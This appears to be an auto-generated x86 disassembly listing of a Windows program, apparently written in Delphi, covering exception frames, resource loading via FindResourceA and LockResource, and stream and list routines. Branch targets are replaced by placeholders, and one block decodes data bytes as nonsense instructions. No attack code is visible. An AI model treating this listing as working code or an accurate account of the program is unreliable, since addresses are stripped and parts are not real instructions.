xor ecx ecx
jmp r-xdata
mov ecx [ rw-data ]
movzx ecx [ ecx ]
mov edx [ edx ]
mov eax esi
call sub_406e0c
mov ecx eax
mov eax [ rw-data ]
movzx eax [ eax ]
mov edx [ edx ]
call sub_406dfc
mov ecx eax
jmp r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bbf8
call sub_403b1c
test ecx ecx
jne r-xdata
sub_41b558
push ebx
push esi
push edi
push ebp
mov esi ecx
mov ebp edx
mov ebx eax
mov eax [ ebx + 0xc ]
test eax eax
jl r-xdata
xor eax eax
test esi esi
jl r-xdata
mov edi eax
add edi esi
test edi edi
jle r-xdata
cmp edi [ ebx + 0x8 ]
jle r-xdata
mov edx [ ebx + 0x4 ]
add edx [ ebx + 0xc ]
mov eax ebp
mov ecx esi
call sub_4028e8
mov [ ebx + 0xc ] edi
mov eax esi
jmp r-xdata
cmp edi [ ebx + 0x10 ]
jle r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov [ ebx + 0x8 ] edi
mov edx edi
mov eax ebx
call sub_41b478
sub_41b5a8
push ebp
mov ebp esp
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_403338
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
call sub_404624
mov ecx eax
mov edx esi
mov eax edi
call sub_41b670
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4036b4
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
call sub_40370c
pop [ fs : 0x0 ]
add esp 0xc
sub_41b600
push ebp
mov ebp esp
add esp 0xfffffff4
xor eax eax
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_41b663
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x6
lea eax [ ebp - 0x8 ]
push eax
push 0x0
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_405fc8
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bb78
call sub_403b1c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41b66a
lea eax [ ebp - 0xc ]
call sub_404164
retn
sub_41b670
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
push esi
call FindResourceA
mov edi eax
mov [ ebx + 0x10 ] edi
test edi edi
jne r-xdata
mov eax [ ebx + 0x10 ]
push eax
push esi
call LoadResource
mov edi eax
mov [ ebx + 0x14 ] edi
test edi edi
jne r-xdata
push ebp
call sub_41b600
pop ecx
mov eax [ ebx + 0x10 ]
push eax
push esi
call SizeofResource
push eax
mov eax [ ebx + 0x14 ]
push eax
call LockResource
mov edx eax
mov eax ebx
pop ecx
call sub_41b398
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
push ebp
call sub_41b600
pop ecx
sub_41b6dc
push ebx
push esi
call sub_40371c
mov ebx edx
mov esi eax
mov eax [ esi + 0x14 ]
call sub_406df8
mov eax [ esi + 0x14 ]
push eax
call FreeResource
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403358
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403704
sub_41b72c
push ebp
mov ebp esp
push ebx
push esi
push edi
test dl dl
je r-xdata
mov ebx edx
mov edi eax
mov esi [ ebp + 0x8 ]
mov [ edi + 0x4 ] ecx
mov eax esi
call sub_4026ec
mov [ edi + 0x8 ] eax
mov [ edi + 0xc ] esi
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4036b4
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
call sub_40370c
pop [ fs : 0x0 ]
add esp 0xc
sub_41b774
push ebx
push esi
call sub_40371c
mov ebx edx
mov esi eax
mov eax [ esi + 0x8 ]
test eax eax
je r-xdata
test bl bl
jle r-xdata
mov edx [ esi + 0xc ]
call sub_40270c
pop esi
pop ebx
retn
mov eax esi
call sub_403704
sub_41b7ad
mov bh 0x41
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx ] cl
mov eax 0x180041
add [ eax ] al
mov al 0x10
inc eax
add [ eax - 0x5bffbfcb ] bl
xor eax 0x35a80040
inc eax
add [ ebp + esi + 0x35a00040 ] ch
inc eax
add [ eax ] al
xor eax [ eax ]
sbb al 0x33
inc eax
add [ eax + 0x33 ] bl
inc eax
add [ eax ] bl
mov ecx 0xe0041
add [ eax ] al
add [ eax ] al
add al [ eax ]
add [ eax ] al
xchg esp eax
adc [ eax ] al
adc [ eax ] al
add [ eax ] al
xchg esp eax
adc [ eax ] al
adc al 0x0
add [ eax ] al
or dl [ eax + edx * 2 + 0x72 ]
outsd
jo r-xdata
add [ eax ] al
xor eax [ eax ]
sbb al 0x33
inc eax
add [ eax + 0x33 ] bl
inc eax
add [ eax ] ch
mov ecx 0x540e0041
push eax
jb r-xdata
imul edi [ eax + 0x75 ] r-xdata
mov eax 0x41
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
push 0x180041b8
add [ eax ] al
add [ eax - 0x67ffbe49 ] ah
xor eax 0x35a40040
inc eax
add [ eax - 0x53ffbfcb ] ch
xor eax 0x35a00040
inc eax
fsubp st3
add [ ebx - 0x76 ] eax
adc eax [ edx + edx * 8 - 0x157ffa8c ]
r-xdata
jo r-xdata
inc ebx
cmp [ ebx ] 0x0
je r-xdata
call sub_40370c
pop [ fs : 0x0 ]
add esp 0xc
outsb
je r-xdata
sub dl 0x2e
jne r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov ebp ebx
sub ebp esi
mov ecx ebp
lea eax [ edi + 0x10 ]
mov edx esi
call sub_404254
mov ecx ebp
inc ecx
lea eax [ edi + 0x14 ]
mov edx 0x1
call sub_4046c4
mov al 0x1
mov esi [ edi + 0x14 ]
mov ebx esi
jmp r-xdata
inc esi
imul edi [ eax + 0x75 ] 0x8b559070
in al dx
push ebx
push esi
test dl dl
je r-xdata
mov dl [ ebx ]
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov [ esi + 0x4 ] ecx
mov eax [ ebp + 0x14 ]
mov [ esi + 0x8 ] eax
mov eax [ ebp + 0x10 ]
mov [ esi + 0xc ] eax
lea eax [ esi + 0x10 ]
mov edx [ ebp + 0xc ]
call sub_4041b8
lea eax [ esi + 0x14 ]
mov edx [ ebp + 0x8 ]
call sub_4041b8
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4036b4
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x10
sub_41b878
push ebp
mov ebp esp
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov [ esi + 0x4 ] ecx
mov eax [ ebp + 0x14 ]
mov [ esi + 0x8 ] eax
mov eax [ ebp + 0x10 ]
mov [ esi + 0xc ] eax
lea eax [ esi + 0x10 ]
mov edx [ ebp + 0xc ]
call sub_4041b8
lea eax [ esi + 0x14 ]
mov edx [ ebp + 0x8 ]
call sub_4041b8
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4036b4
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x10
call sub_40370c
pop [ fs : 0x0 ]
add esp 0xc
sub_41b8d0
push ebx
push esi
push edi
push ebp
mov edi eax
xor eax eax
mov esi [ edi + 0x14 ]
mov ebx esi
jmp r-xdata
mov dl [ ebx ]
test dl dl
je r-xdata
cmp [ ebx ] 0x0
je r-xdata
sub dl 0x2e
jne r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov ebp ebx
sub ebp esi
mov ecx ebp
lea eax [ edi + 0x10 ]
mov edx esi
call sub_404254
mov ecx ebp
inc ecx
lea eax [ edi + 0x14 ]
mov edx 0x1
call sub_4046c4
mov al 0x1
inc ebx
sub_41b928
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_41b99f
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
call sub_405b04
test esi esi
je r-xdata
mov ecx [ ebp - 0x4 ]
mov edx [ ebx + 0xc ]
mov eax [ ebx + 0x4 ]
call sub_415784
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41b9a6
lea eax [ ebp - 0x4 ]
call sub_405b04
retn
mov eax [ ebx + 0xc ]
mov eax [ eax ]
mov eax [ eax ]
call sub_414acc
add eax 0x5
push eax
lea eax [ ebp - 0x4 ]
call sub_405b04
mov ecx eax
mov eax esi
pop edx
call sub_40d4c4
test al al
jne r-xdata
lea eax [ ebp - 0x4 ]
call sub_405b04
sub_41b9ac
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_41ba52
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
mov [ ebp - 0x4 ] eax
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41ba59
lea eax [ ebp - 0x8 ]
call sub_404164
retn
mov edi esi
jmp r-xdata
cmp [ ebx ] 0x0
jne r-xdata
mov eax ebx
jmp r-xdata
mov [ ebp - 0x4 ] edi
mov dl [ ebx ]
test dl dl
je r-xdata
mov ecx ebx
sub ecx eax
lea edx [ ebp - 0x8 ]
xchg edx eax
call sub_404254
mov edx [ ebp - 0x8 ]
mov eax edi
call sub_42168c
mov esi eax
test esi esi
jne r-xdata
add dl 0xd3
sub dl 0x2
jae r-xdata
test esi esi
je r-xdata
mov edx r-xdata
mov eax [ ebp - 0x8 ]
call sub_408184
test al al
je r-xdata
inc ebx
cmp [ ebx ] 0x2e
jne r-xdata
mov esi edi
cmp [ ebx ] 0x2d
jne r-xdata
inc ebx
cmp [ ebx ] 0x3e
jne r-xdata
inc ebx
mov edi esi
inc ebx
sub_41ba74
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx ebx
call sub_4188fc
test eax eax
jge r-xdata
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx ebx
call sub_4188fc
test eax eax
jl r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx ebx
call sub_418744
sub_41baac
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx ebx
call sub_4188fc
cmp eax 0xffffffff
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx ebx
call sub_4188fc
test eax eax
jge r-xdata
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
xchg edx eax
call sub_418790
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx ebx
call sub_418744
sub_41baf4
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x14 ]
xor edx edx
push ebp
push sub_41bc8d
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ rw-data ]
call sub_418c64
mov edi eax
xor edx edx
push ebp
push sub_41bc6e
push [ fs : edx ]
mov [ fs : edx ] esp
cmp [ edi + 0x8 ] 0x0
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41bc75
mov eax [ rw-data ]
call sub_418cc8
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_403338
mov [ ebp - 0x4 ] eax
xor edx edx
push ebp
push sub_41bc4f
push [ fs : edx ]
mov [ fs : edx ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_403338
mov [ ebp - 0x8 ] eax
xor edx edx
push ebp
push sub_41bbfd
push [ fs : edx ]
mov [ fs : edx ] esp
xor esi esi
jmp r-xdata
cmp esi [ edi + 0x8 ]
jl r-xdata
mov edx esi
mov eax edi
call sub_4188a0
mov ebx eax
mov eax [ ebx + 0x10 ]
call sub_418260
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41bc04
mov eax [ ebp - 0x8 ]
call sub_403368
retn
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov edx [ ebx + 0xc ]
mov eax [ ebx + 0x4 ]
call sub_414d54
test eax eax
je r-xdata
push ebp
mov eax [ ebx + 0x4 ]
call sub_41ba74
pop ecx
mov edx esi
mov eax edi
call sub_418790
mov eax ebx
call sub_403368
jmp r-xdata
mov edx [ ebx + 0x14 ]
mov eax [ ebp - 0xc ]
call sub_41b9ac
mov edx eax
mov eax ebx
mov ecx [ eax ]
call [ ecx ]
push ebp
mov eax [ ebx + 0x4 ]
call sub_41baac
pop ecx
inc esi
sub_41bc04
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_403368
retn
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
and [ edi + 0x1c ] 0xff7f
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_4188a0
mov edi eax
mov eax edi
mov edx [ r-xdata ]
call sub_4034f4
test al al
je r-xdata
sub_41bc9c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
cmp [ rw-data ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ rw-data ]
call sub_418c64
mov edi eax
xor eax eax
push ebp
push sub_41bd37
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ edi + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_418cc8
retn
mov edx ebx
mov eax edi
call sub_4188a0
mov esi eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax [ esi + 0x8 ]
cmp eax [ ebp - 0x4 ]
jne r-xdata
mov edx ebx
mov eax edi
call sub_418790
mov eax esi
call sub_403368
mov edx [ esi + 0x10 ]
mov eax [ ebp - 0x8 ]
call sub_408184
test al al
je r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
sub_41bd48
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
cmp [ rw-data ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ rw-data ]
call sub_418c64
mov edi eax
xor eax eax
push ebp
push sub_41bdbf
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ edi + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_418cc8
retn
mov edx ebx
mov eax edi
call sub_4188a0
mov esi eax
mov eax [ esi + 0x4 ]
cmp eax [ ebp - 0x4 ]
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx ebx
mov eax edi
call sub_418790
mov eax esi
call sub_403368
sub_41bdf0
push ebx
add esp 0xfffffff8
mov ebx eax
mov [ esp ] ebx
mov [ esp + 0x4 ] 0xb
push esp
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bc34
call sub_403b1c
pop ecx
pop edx
pop ebx
retn
sub_41be34
push ebx
push esi
push edi
call sub_40371c
mov ebx edx
mov esi eax
mov edx [ esi + 0x10 ]
sub edx [ esi + 0x14 ]
mov eax [ esi + 0x4 ]
mov cx 0x1
mov edi [ eax ]
call [ edi + 0x14 ]
mov edx ebx
and dl 0xfc
mov eax esi
call sub_41b774
test bl bl
jle r-xdata
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_403704
sub_41be70
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
call sub_41dd48
cmp bl al
je r-xdata
pop esi
pop ebx
retn
dec [ esi + 0x10 ]
mov eax esi
call sub_41de58
call sub_41bde4
sub_41be94
push ebp
mov ebp esp
push ebx
push esi
mov esi edx
mov ebx eax
mov edx [ ebx + 0x70 ]
mov eax esi
call sub_408184
test al al
je r-xdata
pop esi
pop ebx
pop ebp
retn 0x10
cmp [ ebp + 0x12 ] 0x0
je r-xdata
mov edx ebx
mov eax [ ebp + 0x14 ]
call [ ebp + 0x10 ]
lea eax [ ebx + 0x70 ]
call sub_404164
sub_41bec8
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x70 ]
mov eax ebx
call sub_408184
test al al
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn 0x10
cmp [ ebp + 0x12 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_41dd48
cmp al 0xa
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_403338
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_41bf89
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0xc ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
call sub_41c30c
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x4 ]
mov eax [ ebp - 0x8 ]
mov edx [ eax + 0x4 ]
mov ecx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_41c30c
mov eax [ ebp - 0x4 ]
mov [ eax + 0x78 ] 0x1
mov edx [ ebp - 0x8 ]
mov eax [ ebp + 0x14 ]
call [ ebp + 0x10 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41bf90
mov eax [ ebp - 0x8 ]
call sub_403368
retn
mov eax [ ebp - 0x4 ]
dec [ eax + 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_41de58
mov eax [ ebp - 0x4 ]
mov [ eax + 0x78 ] 0x1
call sub_41bde4
sub_41bfb8
push ebx
push ecx
mov [ esp ] 0x0
cmp [ eax + 0x5a ] 0x0
je r-xdata
mov al [ esp ]
pop edx
pop ebx
retn
push esp
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x5c ]
call [ ebx + 0x58 ]
sub_41bfd8
push ebx
push esi
push edi
add esp 0xfffffef8
mov esi ecx
mov edi edx
mov ebx eax
lea eax [ esp + 0x8 ]
mov edx esi
mov ecx 0xff
call sub_404400
lea edx [ esp + 0x8 ]
mov eax [ edi ]
call sub_4035d4
mov [ esp ] eax
cmp [ esp ] 0x0
sete [ esp + 0x4 ]
cmp [ ebx + 0x3a ] 0x0
je r-xdata
cmp [ esp + 0x4 ] 0x0
je r-xdata
push esp
lea eax [ esp + 0x8 ]
push eax
mov ecx esi
mov edx ebx
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
mov eax [ esp ]
add esp 0x108
pop edi
pop esi
pop ebx
retn
call sub_41bde4
sub_41c040
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi eax
mov eax [ rw-data ]
call sub_418c64
mov esi eax
xor edx edx
push ebp
push sub_41c0b0
push [ fs : edx ]
mov [ fs : edx ] esp
mov ebx [ esi + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41c0b7
mov eax [ rw-data ]
call sub_418cc8
retn
mov edx ebx
mov eax esi
call sub_4188a0
mov edx [ eax + 0x4 ]
cmp edx [ edi + 0x4 ]
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx [ eax + 0xc ]
cmp edx [ edi + 0xc ]
jne r-xdata
call sub_403368
mov edx ebx
mov eax esi
call sub_418790
sub_41c0bc
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41c1cb
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41c1d2
lea eax [ ebp - 0x8 ]
call sub_404164
retn
xor edx edx
push ebp
push sub_41c1ae
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_41c200
retn
inc eax
mov [ ebp - 0xc ] eax
xor esi esi
mov edx edi
mov eax ebx
mov ecx [ eax ]
call [ ecx ]
mov eax ebx
call sub_41b8d0
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
mov edx esi
call sub_4188a0
mov ebx eax
lea eax [ ebp - 0x8 ]
mov edx [ ebx + 0x14 ]
call sub_4041fc
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x20 ]
mov eax [ ebx + 0x8 ]
mov edx [ ebp - 0x8 ]
call sub_41b9ac
mov edi eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
mov edx esi
call sub_4188a0
call sub_41c040
test edi edi
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
mov edx esi
call sub_4188a0
mov edx eax
mov eax [ rw-data ]
call sub_418bdc
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
xor ecx ecx
mov edx esi
call sub_4189ec
jmp r-xdata
inc esi
dec [ ebp - 0xc ]
jne r-xdata
sub_41c1dc
push ebx
mov ebx eax
mov eax ebx
call sub_41c2d0
cdq
push edx
push eax
mov eax [ ebx + 0x4 ]
call sub_41ad38
xor eax eax
mov [ ebx + 0x10 ] eax
xor eax eax
mov [ ebx + 0x14 ] eax
pop ebx
retn
sub_41c200
push ebx
push esi
push edi
mov ebx eax
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax [ ebx + 0x30 ]
call sub_403368
xor eax eax
mov [ ebx + 0x30 ] eax
inc esi
xor edi edi
mov edx edi
mov eax [ ebx + 0x30 ]
call sub_4188a0
call sub_403368
inc edi
dec esi
jne r-xdata
sub_41c23c
push ebx
push esi
push edi
push ebp
add esp 0xfffffff4
mov [ esp + 0x4 ] ecx
mov [ esp ] eax
mov eax edx
call sub_4032b0
mov ebp eax
jmp r-xdata
cmp ebp [ r-xdata ]
jne r-xdata
mov eax ebp
call sub_417d2c
mov esi eax
test esi esi
je r-xdata
mov eax [ esp ]
mov eax [ eax + 0x74 ]
test eax eax
je r-xdata
mov eax ebp
call sub_4032f4
mov ebp eax
movsx ebx [ esi ]
dec ebx
test ebx ebx
jl r-xdata
mov eax [ esp + 0x4 ]
call sub_417da4
mov edi eax
mov edx [ esp + 0x4 ]
call sub_417ca4
mov edi eax
jmp r-xdata
inc ebx
mov [ esp + 0x8 ] 0x0
mov eax edi
add esp 0xc
pop ebp
pop edi
pop esi
pop ebx
retn
inc [ esp + 0x8 ]
dec ebx
jne r-xdata
mov eax [ esp + 0x8 ]
mov eax [ esi + eax * 4 + 0x2 ]
mov edi [ eax ]
mov edx [ esp + 0x4 ]
mov eax edi
call sub_4032cc
test al al
jne r-xdata
sub_41c30c
push esi
push edi
push ebx
mov edi edx
mov ebx ecx
mov esi eax
jmp r-xdata
or ebx ebx
jne r-xdata
mov ecx [ esi + 0x14 ]
sub ecx [ esi + 0x10 ]
ja r-xdata
pop ebx
pop edi
pop esi
retn
cmp ecx ebx
jb r-xdata
mov eax esi
call sub_41c358
mov ecx [ esi + 0x14 ]
push esi
sub ebx ecx
mov eax [ esi + 0x8 ]
add eax [ esi + 0x10 ]
add [ esi + 0x10 ] ecx
mov esi eax
mov edx ecx
shr ecx 0x2
cld
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
pop esi
mov ecx ebx
sub_41c358
push ebx
push esi
mov ebx eax
mov edx [ ebx + 0x8 ]
mov ecx [ ebx + 0xc ]
mov eax [ ebx + 0x4 ]
mov esi [ eax ]
call [ esi + 0xc ]
mov esi eax
mov [ ebx + 0x14 ] esi
test esi esi
jne r-xdata
xor eax eax
mov [ ebx + 0x10 ] eax
pop esi
pop ebx
retn
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bbf8
call sub_403b1c
sub_41c3a8
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_41c3f3
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_41dba8
mov eax [ ebp - 0x4 ]
call sub_404424
dec eax
jle r-xdata
mov eax [ ebp - 0x4 ]
mov bl [ eax ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41c3fa
lea eax [ ebp - 0x4 ]
call sub_404164
retn
call sub_41bde4
sub_41c400
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x20 ]
xor eax eax
push ebp
push sub_41c4a0
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_41bfa4
test al al
jne r-xdata
mov eax ebx
call sub_41bfa4
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_419554
jmp r-xdata
mov eax ebx
call sub_41c2e8
add al 0xfe
sub al 0x3
jae r-xdata
mov eax ebx
call sub_41cf10
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41c4a7
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x24 ]
retn
mov eax [ ebp - 0x4 ]
call sub_419488
mov esi eax
mov eax ebx
call sub_41cf08
jmp r-xdata
mov eax ebx
call sub_41ce58
mov eax ebx
call sub_41bfa4
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_41d074
mov eax ebx
call sub_41cf10
sub_41c4d0
push ebp
mov ebp esp
push ebx
push esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_405284
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
pop esi
pop ebx
pop ebp
retn
inc ebx
xor esi esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ eax + esi * 4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x34 ]
call sub_418744
inc esi
dec ebx
jne r-xdata
sub_41c50c
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi eax
mov eax edi
call sub_4217a8
mov esi eax
dec esi
test esi esi
jl r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
inc esi
xor ebx ebx
inc ebx
dec esi
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_405284
inc eax
push eax
mov eax [ ebp + 0x8 ]
add eax 0xfffffffc
mov ecx 0x1
mov edx [ r-xdata ]
call sub_405440
add esp 0x4
mov edx ebx
mov eax edi
call sub_42177c
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_405284
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
pop ecx
mov [ edx + eax * 4 - 0x4 ] ecx
mov edx ebx
mov eax edi
call sub_42177c
test [ eax + 0x24 ] 0x4
je r-xdata
sub_41c584
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x3 ] dl
mov [ ebp - 0x2 ] ax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_405284
mov esi eax
dec esi
test esi esi
jl r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
inc esi
xor ebx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edi [ eax + ebx * 4 ]
mov ax [ ebp - 0x2 ]
not eax
and ax [ edi + 0x1c ]
mov edx [ ebp + 0x8 ]
mov [ edi + 0x1c ] ax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edi [ eax + ebx * 4 ]
mov ax [ edi + 0x1c ]
or ax [ ebp - 0x2 ]
mov edx [ ebp + 0x8 ]
mov [ edi + 0x1c ] ax
jmp r-xdata
cmp [ ebp - 0x3 ] 0x0
je r-xdata
inc ebx
dec esi
jne r-xdata
sub_41c5ec
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
test [ eax - 0x9 ] 0x1
jne r-xdata
xor eax eax
pop ebp
retn
